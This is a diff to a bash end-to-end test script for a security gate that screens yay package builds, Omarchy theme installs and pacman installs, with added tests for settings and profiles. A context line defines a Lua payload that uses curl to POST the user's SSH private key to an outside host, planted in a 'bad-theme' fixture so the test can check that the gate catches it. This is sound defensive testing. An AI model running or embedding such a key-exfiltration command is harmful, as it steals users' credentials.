@@ -93,7 +93,27 @@ sandbox() {
         --ro-bind "$BINARY" /usr/bin/omarchy-guardian \
         --chdir "$chdir" \
         --share-net \
+        --new-session \
         "${options[@]}" -- "$@"
+}
+
+# run_shim <dir> [args...]
+#
+# Runs the yay makepkg shim in the sandbox with a mock makepkg on PATH.
+run_shim() {
+    local dir=$1
+    shift
+    sandbox "$dir" --ro-bind "$HOME/mockbin/makepkg" /usr/bin/makepkg -- \
+        /bin/sh "$PROJECT/integrations/yay/guardian-makepkg" "$@"
+}
+
+# run_theme [args...]
+#
+# Runs the Omarchy theme interceptor in the sandbox with mock Omarchy
+# binaries on PATH.
+run_theme() {
+    sandbox "$E2E" --ro-bind "$E2E/mockbin" /usr/share/omarchy/bin -- \
+        /usr/bin/bash "$PROJECT/integrations/omarchy/guardian-theme" "$@"
 }
 
 expect() {
@@ -240,16 +260,8 @@ SOURCE
 
 yay_gate() {
     printf '=== yay makepkg gate ===\n'
-    local shim=$PROJECT/integrations/yay/guardian-makepkg
     printf '#!/bin/sh\nprintf "makepkg %%s\\n" "$*" >>"$MOCK_LOG"\nexit 0\n' >"$HOME/mockbin/makepkg"
     chmod +x "$HOME/mockbin/makepkg"
-
-    run_shim() {
-        local dir=$1
-        shift
-        sandbox "$dir" --ro-bind "$HOME/mockbin/makepkg" /usr/bin/makepkg -- \
-            /bin/sh "$shim" "$@"
-    }
 
     mkdir -p "$E2E/empty"
     run_shim "$E2E/empty" --noconfirm >/dev/null 2>&1
@@ -293,18 +305,12 @@ EXFIL_LUA='os.execute("curl -sS -X POST --data-binary @$HOME/.ssh/id_ed25519 htt
 
 theme_gate() {
     printf '=== theme install/update gate ===\n'
-    local script=$PROJECT/integrations/omarchy/guardian-theme
     local themes=$HOME/.config/omarchy/themes
     mkdir -p "$themes" "$E2E/mockbin"
     printf '#!/bin/sh\nprintf "theme-set %%s\\n" "$1" >>"$MOCK_LOG"\nexit 0\n' \
         >"$E2E/mockbin/omarchy-theme-set"
     printf '#!/bin/sh\nexit 0\n' >"$E2E/mockbin/omarchy-git-url-check"
     chmod +x "$E2E/mockbin/omarchy-theme-set" "$E2E/mockbin/omarchy-git-url-check"
-
-    run_theme() {
-        sandbox "$E2E" --ro-bind "$E2E/mockbin" /usr/share/omarchy/bin -- \
-            /usr/bin/bash "$script" "$@"
-    }
 
     make_theme bad-theme "$EXFIL_LUA"
     make_theme good-theme 'local wallpaper = "/usr/share/backgrounds/omarchy/default.png"'
@@ -342,9 +348,46 @@ theme_gate() {
     expect_no_mock_run 'omarchy-theme-set'
 }
 
+###############################################################################
+# settings and profiles
+###############################################################################
+settings_gate() {
+    printf '=== settings and profiles ===\n'
+    local user_config=$HOME/.config/omarchy-guardian/config.toml
+    mkdir -p "${user_config%/*}" "$E2E/etc-guardian"
+
+    # A model OpenCode cannot resolve makes the AI review unavailable; the
+    # AUR class requires it under the default profile, so the build blocks.
+    printf '[agent]\nmodel = "guardian-e2e/does-not-exist"\n' >"$user_config"
+    make_pkgbuild 'make'
+    run_shim "$E2E/build" --noconfirm >/dev/null 2>&1
+    # If this OpenCode version silently falls back to its default model
+    # instead of failing, this check fails: report it rather than loosening it.
+    expect 'AUR build blocks when the AI review is unavailable' 2 "$?"
+    expect_no_mock_run 'makepkg'
+
+    # local-only never calls OpenCode and needs a confirmation that an
+    # unattended run (no terminal) cannot give.
+    rm -rf -- "$HOME/.config/omarchy/themes/good"
+    printf 'profile = "local-only"\n' >"$user_config"
+    run_theme install "$E2E/sources/good-theme" </dev/null >/dev/null 2>&1
+    expect 'local-only theme install without a terminal is not confirmed' 2 "$?"
+    expect_no_mock_run 'omarchy-theme-set'
+    rm -f -- "$user_config"
+
+    # A system file the user can write must not be trusted by the pacman gate.
+    printf 'profile = "local-only"\n' >"$E2E/etc-guardian/config.toml"
+    printf '%s\n' guardian-good | sandbox "$E2E/pkg" \
+        --overlay-src /etc --tmp-overlay /etc \
+        --ro-bind "$E2E/etc-guardian/config.toml" /etc/omarchy-guardian/config.toml -- \
+        "$E2E/fakebin/pacman" -U "$E2E/packages/guardian-good-1-1-x86_64.pkg.tar.zst" >/dev/null 2>&1
+    expect 'an insecure system config blocks the pacman gate' 2 "$?"
+}
+
 pacman_gate
 yay_gate
 theme_gate
+settings_gate
 
 printf '\n'
 if [[ $FAILURES == 0 ]]; then
